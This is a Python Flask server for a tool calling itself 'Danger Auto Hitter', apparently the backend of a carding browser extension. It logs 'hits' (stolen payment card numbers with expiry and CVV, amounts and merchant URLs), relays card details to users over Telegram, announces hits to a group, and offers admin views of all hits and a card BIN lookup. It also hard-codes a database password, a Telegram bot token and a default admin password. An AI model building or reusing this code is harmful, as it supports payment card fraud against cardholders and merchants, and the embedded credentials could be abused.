import os
import datetime
import random
import string
import requests
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from dotenv import load_dotenv
import bcrypt
import jwt

# Load environment variables
load_dotenv()

app = Flask(__name__)
CORS(app)

# MongoDB Connection
MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb+srv://viraaj35:viraajmongo@danger35.wgk98.mongodb.net/?retryWrites=true&w=majority&appName=Danger35')
client = MongoClient(MONGODB_URI)
db = client["Danger35"]

# Collections
users_collection = db.users
hits_collection = db.hits
activities_collection = db.activities
telegram_users_collection = db.telegram_users
otp_collection = db.otp_codes  # New collection for OTP codes

# JWT Secret
JWT_SECRET = os.getenv('JWT_SECRET', 'danger_auto_hitter_secret')

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7852591229:AAEDyeNGORVhJ1AHIm_qb5l5V9Fkf7JnI-g')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '7506224965')
TELEGRAM_GROUP_ID = os.getenv('TELEGRAM_GROUP_ID', '-1002197681899')  # Add your group chat ID here

# Helper Functions
def generate_api_key():
    """Generate a random API key"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(32))

def generate_otp():
    """Generate a 6-digit OTP"""
    return ''.join(random.choice(string.digits) for _ in range(6))

def send_telegram_message(chat_id, message):
    """Send message to a specific Telegram chat with detailed logging"""
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        print(f'Telegram bot token or chat ID not configured. Token: {TELEGRAM_BOT_TOKEN}, Chat ID: {chat_id}')
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, json=params, timeout=5)
        response_data = response.json()
        print(f"Telegram API response for chat_id {chat_id}: {response.status_code} - {response_data}")
        if response.status_code == 200 and response_data.get('ok'):
            print(f'Telegram message sent successfully to {chat_id}')
            return True
        else:
            error_code = response_data.get('error_code', 'Unknown')
            description = response_data.get('description', 'No description')
            print(f'Failed to send Telegram message to {chat_id}: {error_code} - {description}')
            return False
    except Exception as e:
        print(f'Error sending Telegram message to {chat_id}: {str(e)}')
        return False

def send_to_admin(message):
    """Send message to admin"""
    return send_telegram_message(ADMIN_CHAT_ID, message)

def send_to_group(message):
    """Send message to group chat"""
    if TELEGRAM_GROUP_ID:
        return send_telegram_message(TELEGRAM_GROUP_ID, message)
    return False

def send_to_user(telegram_id, message):
    """Send message to individual user"""
    if telegram_id:
        return send_telegram_message(telegram_id, message)
    return False

# Authentication Decorators
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        auth_header = request.headers.get('Authorization')
        
        if auth_header and auth_header.startswith('Bearer '):
            token = auth_header.split(' ')[1]
            
        if not token:
            return jsonify({'error': 'Access denied'}), 401
            
        try:
            data = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            current_user = users_collection.find_one({'_id': data['id']})
            
            if not current_user:
                return jsonify({'error': 'Invalid token'}), 403
                
            request.user = {
                'id': str(current_user['_id']),
                'username': current_user['username'],
                'isAdmin': current_user.get('isAdmin', False)
            }
        except:
            return jsonify({'error': 'Invalid token'}), 403
            
        return f(*args, **kwargs)
    return decorated

def api_key_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        
        if not api_key:
            return jsonify({'error': 'API key required'}), 401
            
        user = users_collection.find_one({'apiKey': api_key})
        if not user:
            return jsonify({'error': 'Invalid API key'}), 403
            
        request.user = {
            'id': str(user['_id']),
            'username': user['username'],
            'isAdmin': user.get('isAdmin', False)
        }
        return f(*args, **kwargs)
    return decorated

# Routes
@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        email = data.get('email')
        telegram_id = data.get('telegram_id', '')
        
        # Check if user already exists
        existing_user = users_collection.find_one({
            '$or': [
                {'username': username},
                {'email': email}
            ]
        })
        
        if existing_user:
            return jsonify({'error': 'Username or email already exists'}), 400
            
        # Hash password
        hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        
        # Generate API key
        api_key = generate_api_key()
        
        # Create new user
        user = {
            'username': username,
            'password': hashed_password,
            'email': email,
            'apiKey': api_key,
            'isAdmin': False,
            'telegram_id': telegram_id,
            'createdAt': datetime.datetime.now()
        }
        
        result = users_collection.insert_one(user)
        
        # Store Telegram user if provided
        if telegram_id:
            telegram_users_collection.update_one(
                {'telegram_id': telegram_id},
                {'$set': {
                    'username': username,
                    'user_id': str(result.inserted_id),
                    'updated_at': datetime.datetime.now()
                }},
                upsert=True
            )
        
        return jsonify({
            'message': 'User registered successfully',
            'apiKey': api_key
        }), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        telegram_id = data.get('telegram_id', '')
        
        # Find user
        user = users_collection.find_one({'username': username})
        if not user:
            return jsonify({'error': 'Invalid username or password'}), 400
            
        # Validate password
        if not bcrypt.checkpw(password.encode('utf-8'), user['password']):
            return jsonify({'error': 'Invalid username or password'}), 400
            
        # Update Telegram ID if provided
        if telegram_id and telegram_id != user.get('telegram_id', ''):
            users_collection.update_one(
                {'_id': user['_id']},
                {'$set': {'telegram_id': telegram_id}}
            )
            
            # Update or create Telegram user record
            telegram_users_collection.update_one(
                {'telegram_id': telegram_id},
                {'$set': {
                    'username': username,
                    'user_id': str(user['_id']),
                    'updated_at': datetime.datetime.now()
                }},
                upsert=True
            )
            
        # Create token
        token = jwt.encode({
            'id': str(user['_id']),
            'username': user['username'],
            'isAdmin': user.get('isAdmin', False),
            'exp': datetime.datetime.now() + datetime.timedelta(days=7)
        }, JWT_SECRET)
        
        # Log activity
        activity = {
            'userId': user['_id'],
            'type': 'login',
            'action': 'success',
            'details': {'ip': request.remote_addr},
            'timestamp': datetime.datetime.now()
        }
        activities_collection.insert_one(activity)
        
        return jsonify({
            'token': token,
            'apiKey': user['apiKey'],
            'user': {
                'id': str(user['_id']),
                'username': user['username'],
                'email': user['email'],
                'isAdmin': user.get('isAdmin', False),
                'telegram_id': user.get('telegram_id', '')
            }
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/telegram/link', methods=['POST'])
@token_required
def link_telegram():
    try:
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        
        if not telegram_id:
            return jsonify({'error': 'Telegram ID is required'}), 400
            
        # Update user with Telegram ID
        users_collection.update_one(
            {'_id': request.user['id']},
            {'$set': {'telegram_id': telegram_id}}
        )
        
        # Store Telegram user
        telegram_users_collection.update_one(
            {'telegram_id': telegram_id},
            {'$set': {
                'username': request.user['username'],
                'user_id': request.user['id'],
                'updated_at': datetime.datetime.now()
            }},
            upsert=True
        )
        
        return jsonify({'message': 'Telegram account linked successfully'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/hits', methods=['POST'])
@api_key_required
def record_hit():
    try:
        data = request.get_json()
        
        # Get user details
        user = users_collection.find_one({'_id': request.user['id']})
        username = user.get('username', 'Unknown')
        telegram_id = user.get('telegram_id', '')
        
        hit = {
            'userId': request.user['id'],
            'username': username,
            'cardDetails': data.get('cardDetails'),
            'amount': data.get('amount'),
            'email': data.get('email'),
            'businessUrl': data.get('businessUrl'),
            'successUrl': data.get('successUrl'),
            'timestamp': datetime.datetime.now()
        }
        
        result = hits_collection.insert_one(hit)
        
        # Extract card details for notifications
        card_details = data.get('cardDetails', {})
        card_number = card_details.get('cardNumber', '')
        masked_card = card_number
        if len(card_number) > 10:
            masked_card = card_number[:6] + '******' + card_number[-4:]
        
        amount = data.get('amount', 'N/A')
        
        # Send hit notification to the user who got the hit
        if telegram_id:
            send_to_user(telegram_id, 
                f"💰 HIT DETECTED!\n\n"
                f"💳 Card Details:\n{masked_card}|{card_details.get('expiryMonth', '')}|{card_details.get('expiryYear', '')}|{card_details.get('cvv', '')}\n\n"
                f"💵 Amount: {amount}\n"
                f"📧 User Email: {data.get('email', 'N/A')}\n"
                f"🌐 Business URL: {data.get('businessUrl', 'N/A')}\n"
                f"✅ Success URL: {data.get('successUrl', 'N/A')}\n\n"
                f"Powered by Danger Auto Hitter 💪"
            )
        
        # Send limited info to the group chat
        if TELEGRAM_GROUP_ID:
            send_to_group(
                f"PropagandaHitter\n"
                f"⭐ HIT DETECTED ⭐\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 By: {username}\n"
                f"💰 Amount: {amount}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Powered by Team Propaganda 💕"
            )
        
        return jsonify({
            'message': 'Hit recorded successfully',
            'hitId': str(result.inserted_id)
        }), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/activities', methods=['POST'])
@api_key_required
def record_activity():
    try:
        data = request.get_json()
        
        # Get user details
        user = users_collection.find_one({'_id': request.user['id']})
        username = user.get('username', 'Unknown')
        telegram_id = user.get('telegram_id', '')
        
        activity = {
            'userId': request.user['id'],
            'username': username,
            'type': data.get('type'),
            'action': data.get('action'),
            'details': data.get('details'),
            'timestamp': datetime.datetime.now()
        }
        
        activities_collection.insert_one(activity)
        
        # Send Telegram notification for payment form detection
        if data.get('type') == 'payment' and data.get('action') == 'detected':
            details = data.get('details', {})
            
            # Send to user
            if telegram_id:
                send_to_user(telegram_id,
                    f"🔎 PAYMENT FORM DETECTED!\n\n"
                    f"🌐 URL: {details.get('url', 'N/A')}\n"
                    f"📅 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"Powered by Danger Auto Hitter 💪"
                )
        
        return jsonify({'message': 'Activity recorded successfully'}), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/hits', methods=['GET'])
@token_required
def get_hits():
    try:
        hits = list(hits_collection.find({'userId': request.user['id']}).sort('timestamp', -1))
        
        # Convert ObjectId to string for JSON serialization
        for hit in hits:
            hit['_id'] = str(hit['_id'])
            if 'userId' in hit:
                hit['userId'] = str(hit['userId'])
        
        return jsonify(hits)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/activities', methods=['GET'])
@token_required
def get_activities():
    try:
        activities = list(activities_collection.find({'userId': request.user['id']}).sort('timestamp', -1))
        
        # Convert ObjectId to string for JSON serialization
        for activity in activities:
            activity['_id'] = str(activity['_id'])
            if 'userId' in activity:
                activity['userId'] = str(activity['userId'])
        
        return jsonify(activities)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/verify', methods=['GET'])
@token_required
def verify_admin():
    return jsonify({'success': True})

@app.route('/api/admin/users', methods=['GET'])
@token_required
def get_admin_users():
    try:
        if not request.user.get('isAdmin'):
            return jsonify({'error': 'Admin access required'}), 403
            
        limit = int(request.args.get('limit', 0))
        query = users_collection.find({}, {'password': 0})
        
        if limit > 0:
            query = query.limit(limit)
            
        users = list(query)
        
        # Convert ObjectId to string for JSON serialization
        for user in users:
            user['_id'] = str(user['_id'])
        
        return jsonify(users)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/hits', methods=['GET'])
@token_required
def get_admin_hits():
    try:
        if not request.user.get('isAdmin'):
            return jsonify({'error': 'Admin access required'}), 403
            
        limit = int(request.args.get('limit', 0))
        query = hits_collection.find().sort('timestamp', -1)
        
        if limit > 0:
            query = query.limit(limit)
            
        hits = list(query)
        
        # Convert ObjectId to string for JSON serialization
        for hit in hits:
            hit['_id'] = str(hit['_id'])
            if 'userId' in hit:
                hit['userId'] = str(hit['userId'])
        
        return jsonify(hits)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/stats', methods=['GET'])
@token_required
def get_admin_stats():
    try:
        if not request.user.get('isAdmin'):
            return jsonify({'error': 'Admin access required'}), 403
            
        # Get total users
        total_users = users_collection.count_documents({})
        
        # Get total hits
        total_hits = hits_collection.count_documents({})
        
        # Get total activities
        total_activities = activities_collection.count_documents({})
        
        # Get today's hits
        today = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        today_hits = hits_collection.count_documents({'timestamp': {'$gte': today}})
        
        return jsonify({
            'totalUsers': total_users,
            'totalHits': total_hits,
            'totalActivities': total_activities,
            'todayHits': today_hits
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Updated route for generating and sending OTP
@app.route('/api/telegram/send-otp', methods=['POST'])
def send_otp():
    try:
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        
        if not telegram_id:
            print("Missing Telegram ID in request")
            return jsonify({'error': 'Telegram ID is required'}), 400
        
        # Validate Telegram ID format (must be a number)
        try:
            telegram_id = str(telegram_id)  # Convert to string for consistency
            int(telegram_id)  # Ensure it's a valid number
        except ValueError:
            print(f"Invalid Telegram ID format: {telegram_id}")
            return jsonify({'error': 'Telegram ID must be a number'}), 400

        # Generate a 6-digit OTP
        otp = generate_otp()
        
        # Store OTP in database with expiration time (5 minutes)
        expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
        
        otp_data = {
            'telegram_id': telegram_id,
            'otp': otp,
            'expires_at': expiry_time,
            'created_at': datetime.datetime.now(),
            'used': False
        }
        
        # Remove any existing OTPs for this user
        otp_collection.delete_many({'telegram_id': telegram_id})
        
        # Insert new OTP
        otp_collection.insert_one(otp_data)
        
        # Send OTP via Telegram
        message = (
            f"🔐 Your OTP Code\n\n"
            f"Code: {otp}\n"
            f"Valid for 5 minutes\n\n"
            f"Powered by Danger Auto Hitter 💪"
        )
        
        success = send_telegram_message(telegram_id, message)
        
        if success:
            print(f"OTP sent successfully to {telegram_id}: {otp}")
            return jsonify({'success': True, 'message': 'OTP sent successfully'}), 200
        else:
            print(f"Failed to send OTP to {telegram_id}. User may not have started a chat with the bot.")
            return jsonify({
                'error': 'Failed to send OTP via Telegram. Ensure you have started a chat with @danger_hiiter_bot by sending /start.'
            }), 400
        
    except Exception as e:
        print(f"Error sending OTP to {telegram_id}: {str(e)}")
        return jsonify({'error': f'Failed to send OTP: {str(e)}'}), 500

# Route for verifying OTP
@app.route('/api/telegram/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        otp_code = data.get('otp')
        
        if not telegram_id or not otp_code:
            return jsonify({'error': 'Telegram ID and OTP are required'}), 400
        
        # Find the OTP in the database
        otp_record = otp_collection.find_one({
            'telegram_id': telegram_id,
            'otp': otp_code,
            'used': False,
            'expires_at': {'$gt': datetime.datetime.now()}
        })
        
        if not otp_record:
            return jsonify({'error': 'Invalid or expired OTP'}), 400
        
        # Mark OTP as used
        otp_collection.update_one(
            {'_id': otp_record['_id']},
            {'$set': {'used': True}}
        )
        
        # Update user's telegram verification status
        telegram_users_collection.update_one(
            {'telegram_id': telegram_id},
            {'$set': {'verified': True, 'verified_at': datetime.datetime.now()}},
            upsert=True
        )
        
        # Also update any user with this telegram ID
        users_collection.update_many(
            {'telegram_id': telegram_id},
            {'$set': {'telegram_verified': True}}
        )
        
        return jsonify({'success': True, 'message': 'OTP verified successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Telegram webhook for bot commands
@app.route('/api/telegram/webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json()
        print(f"Received webhook data: {data}")
        
        # Process message
        if 'message' in data:
            message = data['message']
            chat_id = message.get('chat', {}).get('id')
            user_id = message.get('from', {}).get('id')
            username = message.get('from', {}).get('username', '')
            text = message.get('text', '')
            
            # Process commands
            if text.startswith('/'):
                command = text.split(' ')[0].lower()
                
                if command == '/start':
                    send_telegram_message(chat_id, 
                        f"Your Telegram ID: {user_id}\n\n"
                        f"Use this ID to link your account in the extension settings."
                    )
                    
                    # Store Telegram user
                    telegram_users_collection.update_one(
                        {'telegram_id': str(user_id)},
                        {'$set': {
                            'telegram_username': username,
                            'chat_id': str(chat_id),
                            'updated_at': datetime.datetime.now()
                        }},
                        upsert=True
                    )
                
                elif command == '/id':
                    send_telegram_message(chat_id, 
                        f"Your Telegram ID: {user_id}\n\n"
                        f"Use this ID to link your account in the extension settings."
                    )
                
                elif command == '/otp':
                    # Generate and send OTP
                    otp = generate_otp()
                    
                    # Store OTP in database
                    expiry_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
                    
                    otp_data = {
                        'telegram_id': str(user_id),
                        'otp': otp,
                        'expires_at': expiry_time,
                        'created_at': datetime.datetime.now(),
                        'used': False
                    }
                    
                    # Remove any existing OTPs for this user
                    otp_collection.delete_many({'telegram_id': str(user_id)})
                    
                    # Insert new OTP
                    otp_collection.insert_one(otp_data)
                    
                    # Send OTP
                    send_telegram_message(chat_id,
                        f"🔐 Your OTP Code\n\n"
                        f"Code: {otp}\n"
                        f"Valid for 5 minutes\n\n"
                        f"Powered by Danger Auto Hitter 💪"
                    )
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Telegram webhook error: {str(e)}")
        return jsonify({'error': str(e)}), 500

# Create admin user if it doesn't exist
admin_username = os.getenv('ADMIN_USERNAME', 'admin')
admin = users_collection.find_one({'username': admin_username})

if not admin:
    hashed_password = bcrypt.hashpw('adminpassword'.encode('utf-8'), bcrypt.gensalt())
    api_key = generate_api_key()
    admin_data = {
        'username': admin_username,
        'password': hashed_password,
        'email': 'admin@example.com',
        'apiKey': api_key,
        'isAdmin': True,
        'telegram_id': ADMIN_CHAT_ID,
        'createdAt': datetime.datetime.now()
    }
    result = users_collection.insert_one(admin_data)
    
    # Store admin in telegram users collection
    telegram_users_collection.update_one(
        {'telegram_id': ADMIN_CHAT_ID},
        {'$set': {
            'username': admin_username,
            'user_id': str(result.inserted_id),
            'is_admin': True,
            'updated_at': datetime.datetime.now()
        }},
        upsert=True
    )
else:
    # Ensure admin has the correct Telegram ID
    if admin.get('telegram_id') != ADMIN_CHAT_ID:
        users_collection.update_one(
            {'_id': admin['_id']},
            {'$set': {'telegram_id': ADMIN_CHAT_ID}}
        )
        
        # Update telegram users collection
        telegram_users_collection.update_one(
            {'telegram_id': ADMIN_CHAT_ID},
            {'$set': {
                'username': admin['username'],
                'user_id': str(admin['_id']),
                'is_admin': True,
                'updated_at': datetime.datetime.now()
            }},
            upsert=True
        )

# Set home route
@app.route("/", methods=["GET"])
def home():
    return jsonify({"message": "✅ Server is running!"}), 200

# Set up Telegram webhook
def setup_telegram_webhook():
    if TELEGRAM_BOT_TOKEN:
        try:
            # Get server URL from environment or use a default for development
            server_url = os.getenv('SERVER_URL', '')
            if server_url:
                webhook_url = f"{server_url}/api/telegram/webhook"
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
                params = {'url': webhook_url}
                
                response = requests.post(url, json=params)
                if response.status_code == 200:
                    print(f"Telegram webhook set to {webhook_url}")
                else:
                    print(f"Failed to set Telegram webhook: {response.text}")
        except Exception as e:
            print(f"Error setting up Telegram webhook: {str(e)}")

print("📌 Available API Routes:")
for rule in app.url_map.iter_rules():
    print(f"➡ {rule.rule} | Methods: {', '.join(rule.methods)}")

@app.route('/api/data', methods=['GET'])
def get_data():
    return jsonify({"message": "Your API is working!"})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 3000))
    
    with app.app_context():  # Ensure webhook setup runs when the app starts
        setup_telegram_webhook()
    
    app.run(host='0.0.0.0', port=port, debug=False)

# Load BIN Data
import json

try:
    with open("bin_data.json", "r") as file:
        bin_database = json.load(file)
except FileNotFoundError:
    bin_database = {}

@app.route("/bin/<bin_number>", methods=["GET"])
def get_bin_info(bin_number):
    bin_info = bin_database.get(bin_number)
    if not bin_info:
        return jsonify({"error": "BIN not found"}), 404
    return jsonify(bin_info)
